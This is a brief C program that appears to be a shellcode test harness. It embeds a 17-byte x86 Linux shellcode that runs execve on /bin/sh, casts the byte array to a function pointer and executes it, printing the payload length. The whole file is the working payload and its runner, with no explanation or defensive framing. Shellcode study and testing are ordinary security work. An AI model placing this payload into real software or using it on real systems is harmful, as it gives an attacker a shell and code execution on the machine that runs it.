#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80";

main()
{
printf("Shellcode Length:  %d\n", strlen(code));
int (*ret)() = (int(*)())code;
ret();

}
